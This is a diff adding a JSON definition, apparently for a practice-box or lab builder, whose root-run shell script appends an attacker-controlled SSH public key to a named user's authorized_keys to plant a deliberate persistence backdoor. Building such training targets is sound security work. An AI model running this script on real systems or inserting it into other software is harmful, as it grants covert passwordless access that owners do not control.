@@ -1,0 +1,10 @@
+{
+  "name": "authorized-keys-persistence",
+  "description": "Practice-box persistence finding: appends an attacker-controlled SSH public key to a named user's authorized_keys, granting key-based passwordless access to whoever holds the private half. Vars: USERNAME (required, must already exist), PUBLIC_KEY (required, full 'ssh-ed25519 AAAA... comment' line).",
+  "platform": "linux",
+  "category": "misconfiguration",
+  "type": "command",
+  "run_as": "root",
+  "depends_on": [],
+  "script": "#!/bin/sh\nset -eu\n\n\n: \"${USERNAME:?USERNAME is required}\"\n: \"${PUBLIC_KEY:?PUBLIC_KEY is required}\"\n\nhome=$(getent passwd \"$USERNAME\" | cut -d: -f6)\nif [ -z \"$home\" ]; then\n    echo \"authorized-keys-persistence: user $USERNAME not found\" >&2\n    exit 1\nfi\n\ninstall -d -m 0700 \"$home/.ssh\"\nkeys=\"$home/.ssh/authorized_keys\"\ntouch \"$keys\"\nif ! grep -Fq -- \"$PUBLIC_KEY\" \"$keys\"; then\n    printf '%s\\n' \"$PUBLIC_KEY\" >> \"$keys\"\nfi\nchmod 0600 \"$keys\"\nchown -R \"$USERNAME\" \"$home/.ssh\"\n"
+}
